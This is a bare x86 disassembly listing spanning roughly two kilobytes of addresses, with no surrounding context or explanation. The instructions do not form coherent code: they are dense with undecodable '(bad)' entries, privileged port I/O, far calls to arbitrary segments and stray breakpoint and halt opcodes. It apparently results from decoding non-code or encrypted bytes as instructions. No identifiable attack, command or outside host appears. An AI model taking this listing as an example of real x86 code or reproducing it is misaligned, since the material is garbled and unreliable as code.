  41fe3a:	sub    eax,0x4d2e5dd1
  41fe3f:	in     al,dx
  41fe40:	sub    ecx,DWORD PTR [eax+0x2c]
  41fe43:	cmp    dh,dh
  41fe45:	fsub   DWORD PTR [edx+0xd02cddc]
  41fe4b:	call   0x7e7c:0x74609f37
  41fe52:	mov    ds:0x8a29b92f,al
  41fe57:	pop    esp
  41fe58:	ins    BYTE PTR es:[edi],dx
  41fe59:	adc    DWORD PTR [ebp-0x7],esi
  41fe5c:	stc    
  41fe5d:	int3   
  41fe5e:	pop    ss
  41fe5f:	mov    eax,gs:0x5fdf16ec
  41fe65:	mov    ecx,0x25e29961
  41fe6a:	sar    esp,1
  41fe6c:	xchg   ebx,eax
  41fe6d:	adc    bh,BYTE PTR [edx-0x47]
  41fe70:	pop    esp
  41fe71:	(bad)  
  41fe72:	gs cmp eax,0xcf2f6b91
  41fe78:	sbb    cl,BYTE PTR [ebx-0x4972aabd]
  41fe7e:	and    eax,0x279b881c
  41fe83:	xor    eax,DWORD PTR [ecx]
  41fe85:	and    al,0xf
  41fe87:	stos   BYTE PTR es:[edi],al
  41fe88:	fwait
  41fe89:	iret   
  41fe8a:	and    BYTE PTR [edx],dh
  41fe8c:	imul   esi,DWORD PTR [edx-0x2feb7033],0x582f4426
  41fe96:	mov    ebx,0x8bc36780
  41fe9b:	jne    0x41fe3f
  41fe9d:	jl     0x41fea3
  41fe9f:	fild   QWORD PTR [eax+ebp*1-0xc596a50]
  41fea6:	or     al,BYTE PTR [ecx-0x3a]
  41fea9:	sti    
  41feaa:	xchg   ebp,eax
  41feab:	popa   
  41feac:	call   0x7129f631
  41feb1:	mov    bh,0xfc
  41feb3:	dec    ebp
  41feb4:	dec    ebp
  41feb5:	popa   
  41feb6:	xor    BYTE PTR [ebp+ecx*4+0x29],ch
  41feba:	call   0x397b:0x5fcb4351
  41fec1:	retf   
  41fec2:	clc    
  41fec3:	push   ebx
  41fec4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fec5:	jmp    0x1564cbe7
  41feca:	lahf   
  41fecb:	mov    WORD PTR [ebx+edi*8-0x51],?
  41fecf:	jo     0x41ff25
  41fed1:	pop    esi
  41fed2:	cmp    al,0x97
  41fed4:	jmp    0x2d909a47
  41fed9:	sbb    al,0x3f
  41fedb:	test   eax,0xab5f09a0
  41fee0:	mov    edi,0x6960a5b8
  41fee5:	sahf   
  41fee6:	add    BYTE PTR [ecx],ch
  41fee8:	mov    ch,BYTE PTR [ecx]
  41feea:	call   DWORD PTR [eax+ecx*2]
  41feed:	pop    esp
  41feee:	je     0x41ff2f
  41fef0:	aas    
  41fef1:	sbb    eax,0xbf30e8a
  41fef7:	dec    edx
  41fef8:	shl    BYTE PTR [ebp+0x18],1
  41fefb:	(bad)  
  41fefe:	pop    eax
  41feff:	sub    BYTE PTR [ebp+0x4c],dl
  41ff02:	push   edi
  41ff03:	jp     0x41feca
  41ff05:	sbb    al,0x37
  41ff07:	inc    ecx
  41ff08:	and    eax,0x48c77045
  41ff0d:	add    al,0x93
  41ff0f:	adc    BYTE PTR [edi-0x2b],al
  41ff12:	jae    0x41ff3d
  41ff14:	or     BYTE PTR [eax+0x4200690a],dl
  41ff1a:	add    cl,bh
  41ff1c:	ss sti 
  41ff1e:	repnz outs dx,BYTE PTR ds:[esi]
  41ff20:	cld    
  41ff21:	retf   0x67f0
  41ff24:	mov    ebx,DWORD PTR [esi+ebp*8+0x5aa47e34]
  41ff2b:	or     edx,DWORD PTR [eax-0x7de2571c]
  41ff31:	mov    DWORD PTR [ebx],esp
  41ff33:	int    0xe6
  41ff35:	mov    ds:0x653372ff,al
  41ff3a:	sub    DWORD PTR [esi],eax
  41ff3c:	ins    DWORD PTR es:[edi],dx
  41ff3d:	nop
  41ff3e:	push   ds
  41ff3f:	mov    ds:0x26d0efb8,eax
  41ff44:	sar    edx,0x34
  41ff47:	cmp    ebp,esi
  41ff49:	fucomi st,st(5)
  41ff4b:	bound  ebp,QWORD PTR [ebp-0x7e97fa7]
  41ff51:	jo     0x41ff2e
  41ff53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff54:	jmp    0x41feda
  41ff56:	cmp    esp,DWORD PTR [edx-0x30]
  41ff59:	add    esp,DWORD PTR [edx+0x37d800bd]
  41ff5f:	(bad)  
  41ff60:	in     eax,dx
  41ff61:	adc    eax,0x2e0fff8a
  41ff66:	ret    
  41ff67:	jl     0x41ff59
  41ff69:	leave  
  41ff6a:	pop    ss
  41ff6b:	cmp    al,dl
  41ff6d:	outs   dx,DWORD PTR ds:[esi]
  41ff6e:	test   al,0xfa
  41ff70:	ss push ecx
  41ff72:	inc    esi
  41ff73:	pop    esi
  41ff74:	fst    DWORD PTR [edi+0xc9368ab]
  41ff7a:	mov    bl,0xa9
  41ff7c:	mov    bh,0xc6
  41ff7e:	jb     0x41ffd9
  41ff80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ff81:	js     0x41ffa3
  41ff83:	(bad)  
  41ff84:	fsub   st(5),st
  41ff86:	mov    ecx,DWORD PTR [esi+0x7b]
  41ff89:	cli    
  41ff8a:	out    dx,al
  41ff8b:	ins    BYTE PTR es:[edi],dx
  41ff8c:	jne    0x41fff5
  41ff8e:	sub    BYTE PTR [edi-0x1c7b7dd4],0xca
  41ff95:	(bad)  [ebx-0x3c39066f]
  41ff9b:	sub    eax,0xe2b7e089
  41ffa0:	xchg   esi,eax
  41ffa1:	sub    eax,ebx
  41ffa3:	(bad)  
  41ffa4:	ror    BYTE PTR [ebx],0xfd
  41ffa7:	sbb    al,0xe2
  41ffa9:	sbb    al,al
  41ffab:	push   0xd0cd571b
  41ffb0:	or     BYTE PTR [edx+0x74d2c050],ch
  41ffb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ffb7:	imul   ebx,DWORD PTR [esi+eax*1+0x7169f4b2],0x2d221aba
  41ffc2:	mov    BYTE PTR [ebp+0x4a],cl
  41ffc5:	sbb    esp,edi
  41ffc7:	imul   esi,DWORD PTR [ebx],0xffffffd1
  41ffca:	lahf   
  41ffcb:	push   0xeecd19bf
  41ffd0:	pop    ds
  41ffd1:	cwde   
  41ffd2:	pop    edx
  41ffd3:	dec    edi
  41ffd4:	mov    DWORD PTR [ebx],ebx
  41ffd6:	repnz mov bh,0x9c
  41ffd9:	adc    BYTE PTR [ebp-0x381c91f2],0xfb
  41ffe0:	lods   al,BYTE PTR ds:[esi]
  41ffe1:	add    dh,dh
  41ffe3:	js     0x420020
  41ffe5:	(bad)  
  41ffe6:	pop    edi
  41ffe7:	push   ss
  41ffe8:	pushf  
  41ffe9:	mov    eax,0xc29c6514
  41ffee:	jno    0x41ff9f
  41fff0:	pop    esp
  41fff1:	bound  edx,QWORD PTR [ebx]
  41fff3:	sub    BYTE PTR [ecx],dh
  41fff5:	and    DWORD PTR [edx+ebx*2+0x7],ebx
  41fff9:	and    BYTE PTR [edi+eax*8],bh
  41fffc:	lods   eax,DWORD PTR ds:[esi]
  41fffd:	fidiv  WORD PTR [ebx]
  41ffff:	test   BYTE PTR [edx],0x91
  420002:	ss add ah,bh
  420005:	inc    esi
  420006:	or     al,0x3e
  420008:	enter  0xa20d,0x36
  42000c:	push   eax
  42000d:	(bad)  
  42000e:	push   ds
  42000f:	dec    ecx
  420010:	mov    dl,0xd5
  420012:	cdq    
  420013:	js     0x420025
  420015:	push   edi
  420016:	les    ebx,FWORD PTR [esi-0x6a]
  420019:	fucom  st(3)
  42001b:	inc    esp
  42001c:	xor    DWORD PTR [esi-0x7],edx
  42001f:	rcr    DWORD PTR [esi+0x2b3ee2aa],cl
  420025:	fld    DWORD PTR [ebx]
  420027:	es loop 0x420089
  42002a:	dec    edi
  42002b:	lods   eax,DWORD PTR ds:[esi]
  42002c:	push   edi
  42002d:	xor    eax,0x2da56c1e
  420032:	stos   BYTE PTR es:[edi],al
  420033:	and    BYTE PTR [eax],bh
  420035:	fadd   QWORD PTR [edi]
  420037:	sub    eax,0x5eb5b96
  42003c:	dec    ebx
  42003d:	mov    cl,0x90
  42003f:	mov    ds:0x28329a7a,al
  420044:	cmp    al,0x43
  420046:	aas    
  420047:	dec    ebp
  420048:	ror    DWORD PTR [edx+0x7285696a],0x33
  42004f:	mov    edx,0xc68d7baf
  420054:	test   DWORD PTR [ecx+0x57],esi
  420057:	or     al,0xb9
  420059:	and    DWORD PTR [eax+0x32],esp
  42005c:	sub    ebp,0x2b
  42005f:	nop
  420060:	adc    eax,0xfa6ab698
  420065:	int3   
  420066:	aaa    
  420067:	pop    ecx
  420068:	test   eax,0x74cd2643
  42006d:	mov    bl,0x53
  42006f:	cmp    DWORD PTR [edx],0x1a5ffbd
  420075:	pop    edi
  420076:	rcr    DWORD PTR [ebp-0x158ef9d8],1
  42007c:	ins    DWORD PTR es:[edi],dx
  42007d:	addr16 pushf 
  42007f:	add    al,0x3a
  420081:	lahf   
  420082:	or     edi,esi
  420084:	pop    ecx
  420085:	fisubr DWORD PTR [esp+esi*8]
  420088:	adc    bh,cl
  42008a:	pop    es
  42008b:	out    dx,al
  42008c:	arpl   WORD PTR [ebp-0x55],dx
  42008f:	cmp    BYTE PTR [ebx],dl
  420091:	jecxz  0x420103
  420093:	mov    ebp,0x3a60417c
  420098:	ins    BYTE PTR es:[edi],dx
  420099:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42009a:	lods   al,BYTE PTR ds:[esi]
  42009b:	add    BYTE PTR [ebx+0x27],ch
  42009e:	icebp  
  42009f:	mov    ch,0xc3
  4200a1:	out    0xb7,eax
  4200a3:	fistp  QWORD PTR [eax]
  4200a5:	out    dx,al
  4200a6:	mov    WORD PTR [edi-0x85f1f3a],cs
  4200ac:	or     ebx,ebx
  4200ae:	lock mov edi,0xf4fbb4b3
  4200b4:	pop    es
  4200b5:	mov    ds:0xa5a3a51e,al
  4200ba:	repz dec eax
  4200bc:	cld    
  4200bd:	adc    DWORD PTR [edi-0x2b],eax
  4200c0:	fisub  WORD PTR [ebx-0x4e]
  4200c3:	xchg   ebp,eax
  4200c4:	xor    DWORD PTR [ecx],edx
  4200c6:	xor    esp,eax
  4200c8:	nop
  4200c9:	icebp  
  4200ca:	call   0x38dc:0x8eef149d
  4200d1:	push   eax
  4200d2:	out    dx,eax
  4200d3:	or     al,BYTE PTR [esi-0x7]
  4200d6:	inc    ebx
  4200d7:	aam    0xf0
  4200d9:	inc    esi
  4200da:	adc    eax,0xd92b8aca
  4200df:	mov    ds:0x701122ca,eax
  4200e4:	pop    eax
  4200e5:	pop    eax
  4200e6:	push   ecx
  4200e7:	add    BYTE PTR [edi],0x8
  4200ea:	pop    DWORD PTR [edx]
  4200ec:	call   0x6c5cb01e
  4200f1:	mov    ch,dl
  4200f3:	pop    edi
  4200f4:	and    eax,DWORD PTR [ebx-0x303556d4]
  4200fa:	clc    
  4200fb:	mov    WORD PTR [eax+0x77b31119],es
  420101:	ret    0x44b6
  420104:	(bad)  
  420105:	stos   DWORD PTR es:[edi],eax
  420106:	sub    edi,0xffffffea
  420109:	ret    0xea84
  42010c:	add    BYTE PTR [ecx+ebp*8-0x5c3d670a],cl
  420113:	bswap  ebx
  420115:	add    al,0xc3
  420117:	out    dx,eax
  420118:	xchg   ebx,eax
  420119:	jmp    0x420199
  42011b:	hlt    
  42011c:	repz pop esi
  42011e:	push   ebx
  42011f:	adc    cl,BYTE PTR [esi]
  420121:	fsub   QWORD PTR [ebx-0x5fa00e24]
  420127:	daa    
  420128:	xchg   DWORD PTR [esi+0x179465bf],edx
  42012e:	inc    edx
  42012f:	pop    esp
  420130:	add    dl,cl
  420132:	test   eax,0xd4ef3bfd
  420137:	sbb    eax,0x66ce0176
  42013c:	(bad)  
  42013e:	xlat   BYTE PTR ds:[ebx]
  42013f:	cdq    
  420140:	mov    ds:0xbb1a7236,al
  420145:	sbb    BYTE PTR [eax+0x35],dh
  420148:	pop    edx
  420149:	xor    eax,0xe7d7ae4
  42014e:	jle    0x4201cf
  420150:	push   cs
  420151:	adc    DWORD PTR [ecx],ebp
  420153:	adc    esp,DWORD PTR [ecx+ecx*4-0x11]
  420157:	ja     0x420100
  420159:	jg     0x4201c7
  42015b:	mul    DWORD PTR [ebx-0x5c]
  42015e:	scas   eax,DWORD PTR es:[edi]
  42015f:	pop    esi
  420160:	jo     0x420151
  420162:	hlt    
  420163:	mov    esi,0x5fd7aaff
  420168:	xchg   ecx,eax
  420169:	std    
  42016a:	js     0x420195
  42016c:	rcl    DWORD PTR [esp+ecx*4],0xa
  420170:	adc    DWORD PTR [esi-0x3ac84b12],esi
  420176:	sub    DWORD PTR [edi],edx
  420178:	(bad)  
  420179:	aas    
  42017a:	aaa    
  42017b:	into   
  42017c:	push   ebp
  42017d:	or     al,0x73
  42017f:	cmp    al,0x2b
  420181:	push   eax
  420182:	or     ebx,DWORD PTR [edx]
  420184:	nop
  420185:	lahf   
  420186:	sbb    al,BYTE PTR [edx-0x1e40eaf8]
  42018c:	pop    es
  42018d:	inc    esi
  42018e:	aad    0x5c
  420190:	push   esp
  420191:	stos   DWORD PTR es:[edi],eax
  420192:	ss xchg esi,eax
  420194:	and    BYTE PTR [ebp-0x8],ah
  420197:	sub    eax,DWORD PTR [ebp+0x35]
  42019a:	xor    BYTE PTR [edi+0x15c800e5],dh
  4201a0:	mov    WORD PTR [edx-0x6df204d5],ds
  4201a6:	cwde   
  4201a7:	push   0xdfe76571
  4201ac:	cmp    eax,0xb4704494
  4201b1:	mov    edi,0x47bd8847
  4201b6:	or     al,0x2f
  4201b8:	xchg   ecx,eax
  4201b9:	mov    cl,0xf0
  4201bb:	pop    ecx
  4201bc:	mov    eax,0x3d0ba5a6
  4201c1:	xor    eax,0x8596cf43
  4201c6:	or     BYTE PTR [eax-0x23eaeb40],dh
  4201cc:	add    ch,BYTE PTR [esi-0xa60f060]
  4201d2:	jnp    0x420234
  4201d4:	stc    
  4201d5:	push   edi
  4201d6:	mov    bl,0xac
  4201d8:	lods   eax,DWORD PTR ds:[esi]
  4201d9:	fwait
  4201da:	imul   DWORD PTR [edx]
  4201dc:	jae    0x420167
  4201de:	mov    ebx,0x2efce6b3
  4201e3:	sti    
  4201e4:	xor    bh,BYTE PTR [esi-0x71]
  4201e7:	ret    0x5fb7
  4201ea:	das    
  4201eb:	add    dh,al
  4201ed:	mov    cl,0x4a
  4201ef:	(bad)  
  4201f0:	test   DWORD PTR [ecx+0x65],ebx
  4201f3:	ins    BYTE PTR es:[edi],dx
  4201f4:	dec    eax
  4201f5:	jle    0x420262
  4201f7:	sbb    DWORD PTR [ebx+edx*4+0x6aac85b7],0x5d
  4201ff:	cmp    BYTE PTR [eax-0x51981077],bh
  420205:	dec    esi
  420206:	add    bl,BYTE PTR [edi-0x268a5bf7]
  42020c:	stos   BYTE PTR es:[edi],al
  42020d:	xchg   ecx,eax
  42020e:	je     0x42022d
  420210:	inc    edi
  420211:	clc    
  420212:	dec    esi
  420213:	(bad)  
  420214:	imul   eax,DWORD PTR [ebx-0x507463b2],0x4d
  42021b:	(bad)  
  42021c:	and    dh,BYTE PTR [edx+0x7a74892b]
  420222:	jmp    0x4201bd
  420224:	loopne 0x4201e1
  420226:	adc    dh,BYTE PTR [eax]
  420228:	mov    ds:0x3c612d7b,eax
  42022d:	mov    ah,0x5c
  42022f:	mov    DWORD PTR [ecx+ecx*4+0x2eca7116],eax
  420236:	cmp    bl,BYTE PTR [edi+0x52]
  420239:	mov    al,0xfd
  42023b:	add    ecx,DWORD PTR [eax+eiz*4+0x3a]
  42023f:	jge    0x42022b
  420241:	(bad)  
  420242:	data16 scas al,BYTE PTR es:[edi]
  420244:	cmovbe esp,DWORD PTR [eax+0x38]
  420248:	sbb    al,al
  42024a:	je     0x42024f
  42024c:	dec    esp
  42024d:	cwde   
  42024e:	sbb    eax,0xb94aa829
  420253:	test   eax,0x9f4797d3
  420258:	ins    DWORD PTR es:[edi],dx
  420259:	test   eax,0xc71d46d6
  42025e:	jmp    0x420285
  420260:	add    bh,BYTE PTR [edi]
  420262:	pop    edi
  420263:	call   0xf3ac:0x21054c20
  42026a:	sub    eax,edi
  42026c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42026d:	lahf   
  42026e:	cmp    eax,0x4405ae34
  420273:	inc    ecx
  420274:	cmp    eax,DWORD PTR [eax]
  420276:	and    al,BYTE PTR [eax-0x26289fe5]
  42027c:	pop    ebx
  42027d:	(bad)
  420281:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420282:	ret    
  420283:	mov    edx,0xdf3b9690
  420288:	les    ebp,FWORD PTR ds:0xc4a881fb
  42028e:	xchg   DWORD PTR [esi+0x1d974cb],ecx
  420294:	xchg   ebp,eax
  420295:	sbb    DWORD PTR [ebx-0x4f],eax
  420298:	ins    BYTE PTR es:[edi],dx
  420299:	cmp    esi,DWORD PTR [esp+ecx*1]
  42029c:	sbb    BYTE PTR [edx-0x64fa7a22],dh
  4202a2:	shl    BYTE PTR [eax+0x56322398],cl
  4202a8:	pop    ecx
  4202a9:	nop
  4202aa:	xchg   edi,eax
  4202ab:	fsub   st(0),st
  4202ad:	inc    edx
  4202ae:	repz push es
  4202b0:	icebp  
  4202b1:	mov    al,0xc8
  4202b3:	adc    al,0xd2
  4202b5:	and    eax,0xe313f2e9
  4202ba:	sbb    eax,0xfd54aaf2
  4202bf:	mov    ebx,0x5417bd61
  4202c4:	outs   dx,BYTE PTR ds:[esi]
  4202c5:	fldenv [edi+0x44]
  4202c8:	sar    BYTE PTR [ecx+esi*4-0x2c],0xb4
  4202cd:	pop    ebp
  4202ce:	stos   BYTE PTR es:[edi],al
  4202cf:	push   edi
  4202d0:	mov    edx,0xbed90f9f
  4202d5:	inc    ebp
  4202d6:	fisttp QWORD PTR [edx-0x5b]
  4202d9:	mov    esi,0xe4c50ef3
  4202de:	hlt    
  4202df:	aas    
  4202e0:	ins    DWORD PTR es:[edi],dx
  4202e1:	loop   0x4202ef
  4202e3:	clc    
  4202e4:	jns    0x420319
  4202e6:	ficomp DWORD PTR [edx+0xa]
  4202e9:	inc    esi
  4202ea:	lds    ecx,FWORD PTR [edi+eiz*1-0x4a82c03f]
  4202f1:	or     esi,ebp
  4202f3:	dec    edx
  4202f4:	sar    DWORD PTR ds:0xe170ae5f,1
  4202fa:	xchg   esp,eax
  4202fb:	xlat   BYTE PTR ds:[ebx]
  4202fc:	pop    es
  4202fd:	or     dh,BYTE PTR [ebx+0x598d8a6e]
  420303:	xchg   ecx,ecx
  420305:	push   edi
  420306:	xchg   BYTE PTR [ebp+0x6],dh
  420309:	jmp    0x8ac65607
  42030e:	lahf   
  42030f:	je     0x420377
  420311:	mov    BYTE PTR [ecx+0x75],dh
  420314:	xor    ebp,0xfffffffd
  420317:	sbb    al,0xc6
  420319:	cmp    DWORD PTR [edi-0x60f47cf9],ecx
  42031f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420320:	leave  
  420321:	xor    eax,ecx
  420323:	mov    esi,0x1ac35568
  420328:	scas   al,BYTE PTR es:[edi]
  420329:	inc    esi
  42032a:	mov    al,ds:0x282b2068
  42032f:	xor    eax,0xd04b77a7
  420334:	inc    esp
  420335:	mov    BYTE PTR ds:0xefa0d790,al
  42033b:	adc    DWORD PTR [edx-0x26],0x2d
  42033f:	dec    ebp
  420340:	sub    ch,BYTE PTR [edx-0x3a0c9646]
  420346:	xor    al,0x38
  420348:	dec    edi
  420349:	push   ebp
  42034a:	inc    ecx
  42034b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42034c:	xchg   esi,eax
  42034d:	fucomi st,st(3)
  42034f:	mov    eax,ds:0x23604284
  420354:	repz (bad) 
  420356:	(bad)  
  420357:	adc    al,0x9b
  420359:	lock jno 0x420398
  42035c:	sbb    esi,DWORD PTR [esi+0x15]
  42035f:	jbe    0x4202f7
  420361:	es push edi
  420363:	jns    0x420336
  420365:	pop    es
  420366:	fsubr  QWORD PTR ss:[edi-0x51c159ef]
  42036d:	inc    ebx
  42036e:	adc    cl,BYTE PTR [esi]
  420370:	test   DWORD PTR [edi],0xf023b833
  420376:	leave  
  420377:	sub    ebp,0xffffffa1
  42037a:	jge    0x420335
  42037c:	or     DWORD PTR [ebx-0x6a],ecx
  42037f:	cmp    al,0x98
  420381:	lds    esp,FWORD PTR [edi-0x4eeeb7eb]
  420387:	sub    BYTE PTR [ebx],al
  420389:	aas    
  42038a:	push   ebp
  42038b:	push   ebx
  42038c:	and    BYTE PTR [eax],0xf2
  42038f:	lock or BYTE PTR [edx-0x43],al
  420393:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420394:	inc    edx
  420395:	cmp    al,0x7c
  420397:	ret    0xe7c3
  42039a:	jecxz  0x420372
  42039c:	repnz sbb edi,ebx
  42039f:	xor    bl,BYTE PTR [edi+ebx*2+0x3eb4e92d]
  4203a6:	imul   ecx,DWORD PTR [eax+edx*8-0x46],0x33a645a4
  4203ae:	xchg   edi,eax
  4203af:	leave  
  4203b0:	or     eax,0x6ce42e69
  4203b5:	scas   eax,DWORD PTR es:[edi]
  4203b6:	inc    ecx
  4203b7:	int3   
  4203b8:	sub    BYTE PTR [esi-0xf],cl
  4203bb:	pusha  
  4203bc:	in     eax,0x3c
  4203be:	mov    DWORD PTR [ecx+0x4c4518bb],eax
  4203c4:	adc    al,0xb5
  4203c6:	adc    al,0xce
  4203c8:	call   0xa7b2:0xf25ed273
  4203cf:	xchg   ebp,eax
  4203d0:	push   cs
  4203d1:	push   eax
  4203d2:	sbb    bl,ch
  4203d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4203d5:	jl     0x420417
  4203d7:	(bad)  
  4203d8:	sub    al,BYTE PTR [ebp-0x707fe075]
  4203de:	fld    TBYTE PTR [ebp+0x4da3ba40]
  4203e4:	add    dh,BYTE PTR [eax]
  4203e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4203e7:	sbb    al,0x12
  4203e9:	das    
  4203ea:	xchg   ebx,eax
  4203eb:	les    edi,FWORD PTR [edx-0x130aeee5]
  4203f1:	push   edx
  4203f2:	lods   al,BYTE PTR ds:[esi]
  4203f3:	jmp    0x4c87:0x4ef93490
  4203fa:	jae    0x4203e6
  4203fc:	push   ebx
  4203fd:	sbb    DWORD PTR [ecx+0x5a],esi
  420400:	or     DWORD PTR [ecx],edx
  420402:	add    al,0x46
  420404:	pop    ss
  420405:	jle    0x42045a
  420407:	adc    edx,DWORD PTR [eax+ebx*8+0x2472cd73]
  42040e:	add    al,bl
  420410:	rcl    BYTE PTR [ebx-0x44],cl
  420413:	add    DWORD PTR [esi+0x20],eax
  420416:	push   0xffffffbf
  420418:	shl    DWORD PTR [edi+0x59],0x14
  42041c:	xchg   edx,eax
  42041d:	inc    eax
  42041e:	pushf  
  42041f:	cmp    DWORD PTR [eax-0x67],edx
  420422:	pop    esp
  420423:	mov    ds:0xb71c50dc,eax
  420428:	cmp    edi,DWORD PTR [ebx]
  42042a:	cdq    
  42042b:	inc    ebx
  42042c:	stc    
  42042d:	jbe    0x4204ad
  42042f:	xchg   esi,eax
  420430:	das    
  420431:	mov    ebx,0xa314c076
  420436:	mov    bh,al
  420438:	mov    ah,0xa2
  42043a:	mov    BYTE PTR [edi],bh
  42043c:	dec    eax
  42043d:	mov    eax,0x72c3c74c
  420442:	fwait
  420443:	adc    al,0xd7
  420445:	pop    ds
  420446:	push   esi
  420447:	xchg   ecx,eax
  420448:	retf   0x15e0
  42044b:	fs ret 
  42044d:	scas   al,BYTE PTR es:[edi]
  42044e:	pop    es
  42044f:	out    0x4c,al
  420451:	repnz dec DWORD PTR [ebx+esi*1-0x4e]
  420456:	(bad)  
  420457:	xor    DWORD PTR [ecx+edx*1],edx
  42045a:	fcmovbe st,st(2)
  42045c:	retf   
  42045d:	xor    ah,0x2f
  420460:	popf   
  420461:	adc    al,0x55
  420463:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420464:	add    al,0x15
  420466:	cmp    DWORD PTR [ebp+0x6],eax
  420469:	lahf   
  42046a:	adc    ecx,DWORD PTR [eax]
  42046c:	imul   ebx,DWORD PTR [edx-0x2c88931c],0x9e62fd87
  420476:	int3   
  420477:	rcr    DWORD PTR [ebp-0x4b],0x41
  42047b:	stc    
  42047c:	mov    bl,0x7e
  42047e:	dec    edi
  42047f:	add    DWORD PTR [ecx-0x44],0x89521f35
  420486:	sub    BYTE PTR [esi+0x15b95e2d],0x6f
  42048d:	mov    eax,0x16bc6f0c
  420492:	(bad)  
  420493:	ins    DWORD PTR es:[edi],dx
  420494:	dec    ebx
  420495:	push   eax
  420496:	(bad)  
  420497:	ret    
  420498:	pushf  
  420499:	mov    ebx,0x4bdb0407
  42049e:	mov    BYTE PTR [ecx+0x3e2d5439],dh
  4204a4:	push   cs
  4204a5:	jl     0x4204ff
  4204a7:	push   ecx
  4204a8:	fdivr  QWORD PTR [ebx-0x684c008b]
  4204ae:	or     eax,0x1b23653e
  4204b3:	repz test al,0x25
  4204b6:	sbb    DWORD PTR ds:0xea43ac0b,0xce1b6e68
  4204c0:	mov    ecx,0xb37f6442
  4204c5:	inc    ebp
  4204c6:	not    DWORD PTR [edx-0x7477b43c]
  4204cc:	mov    bh,0x9e
  4204ce:	mov    esp,0xba15a1b0
  4204d3:	push   ds
  4204d4:	mov    esp,0x79e5c82b
  4204d9:	add    al,0xbe
  4204db:	jmpw   0xd837
  4204df:	sbb    BYTE PTR [ebp-0x24],bl
  4204e2:	pop    ebp
  4204e3:	inc    eax
  4204e4:	out    0xb1,eax
  4204e6:	mov    ds:0xeca963d,eax
  4204eb:	fild   DWORD PTR [esi-0x4db18361]
  4204f1:	leave  
  4204f2:	jnp    0x420537
  4204f4:	xchg   BYTE PTR [ebx+0x255f5a39],cl
  4204fa:	or     ecx,DWORD PTR [esi+0x4f]
  4204fd:	push   esi
  4204fe:	cmp    BYTE PTR [edx-0x336970e5],0x28
  420505:	or     DWORD PTR [edx],0xffffffc5
  420508:	jmp    0xb914580b
  42050d:	jmp    0x24b7:0x5ddae116
  420514:	test   eax,0xd7a011ac
  420519:	push   ds
  42051a:	or     DWORD PTR [ebp+0x63d49d94],0xffffffef
  420521:	aam    0x55
  420523:	xor    al,0xe9
  420525:	dec    esp
  420526:	in     eax,dx
  420527:	pop    edx
  420528:	adc    eax,0x46f96715
  42052d:	pop    ds
  42052e:	aad    0x5c
  420530:	pop    eax
  420531:	cmp    eax,0x989d4136
  420536:	in     eax,dx
  420537:	or     al,0x96
  420539:	lock or eax,0xd92b34d9
  42053f:	pop    esp
  420540:	cmp    ah,BYTE PTR [eax-0x40d52550]
  420546:	add    ebp,DWORD PTR [ebx+0x6d]
  420549:	push   0xea55cc3
  42054e:	mov    ebx,0x5a6c9c97
  420553:	cmp    eax,0x1a61d9d
  420558:	xchg   ebx,eax
  420559:	push   cs
  42055a:	pop    ebx
  42055b:	or     edx,eax
  42055d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42055e:	out    0xcc,eax
  420560:	pop    edi
  420561:	pop    esp
  420562:	pop    ebp
  420563:	sbb    bl,dl
  420565:	dec    ebx
  420566:	repnz mov bl,0x40
  420569:	fcomp  DWORD PTR [esi-0x61f940a5]
  42056f:	scas   al,BYTE PTR es:[edi]
  420570:	mov    edx,0x7423ad52
  420575:	(bad)
  420578:	fiadd  DWORD PTR [edx]
  42057a:	xchg   edx,eax
  42057b:	sbb    ebx,DWORD PTR [ebx-0x30]
  42057e:	dec    edi
  42057f:	loop   0x420565
  420581:	xchg   DWORD PTR [edx+0x3b],eax
  420584:	shl    BYTE PTR [ebx],0xcf
  420587:	outs   dx,BYTE PTR ds:[esi]
  420588:	mov    dl,0x32
  42058a:	jo     0x42053c
  42058c:	mov    cl,0xf6
  42058e:	sub    BYTE PTR [edx+edi*4-0xd],0x58
  420593:	sub    eax,0x7ab13138
  420598:	cmp    DWORD PTR [ebx+0x18],ebp
  42059b:	dec    esp
  42059c:	push   eax
  42059d:	stos   DWORD PTR es:[edi],eax
  42059e:	push   cs
  42059f:	or     ecx,DWORD PTR [edx+edi*1]
  4205a2:	xchg   ebx,eax
  4205a3:	cld    
  4205a4:	pop    esp
  4205a5:	aaa    
  4205a6:	ds repnz push 0xffffffcc
  4205aa:	mov    dl,0xcb
  4205ac:	in     eax,0xa1
  4205ae:	add    eax,0x9ec79fd9
  4205b3:	push   cs
  4205b4:	sub    DWORD PTR ds:[eax+eax*8],edx
  4205b8:	push   ebp
  4205b9:	pop    esp
  4205ba:	adc    bh,BYTE PTR [ecx]
  4205bc:	shl    esi,0x70
  4205bf:	pop    edi
  4205c0:	and    DWORD PTR [ebx+0x631d09bd],esi
  4205c6:	xchg   BYTE PTR [edi+ebx*8-0x71806a50],al
  4205cd:	adc    BYTE PTR [edi],0xf
  4205d0:	inc    esi
  4205d1:	jmp    0x4d4287cb
  4205d6:	stos   DWORD PTR es:[edi],eax
  4205d7:	cmp    DWORD PTR ds:[eax+0x31],edx
  4205db:	mov    ecx,0xa34d3f19
  4205e0:	push   edx
  4205e1:	scas   al,BYTE PTR es:[edi]
  4205e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4205e3:	es jg  0x4205c2
  4205e6:	xor    bh,cl
  4205e8:	loop   0x420621
  4205ea:	cmp    eax,0xb91a1e07
  4205ef:	stos   BYTE PTR es:[edi],al
  4205f0:	shl    DWORD PTR [edi+0x2992437],0x9d
  4205f7:	out    0x33,al
  4205f9:	jnp    0x420601
  4205fb:	and    esi,DWORD PTR [esi]
  4205fd:	call   0x2f2986be
  420602:	lock jns 0x420602
  420605:	push   es
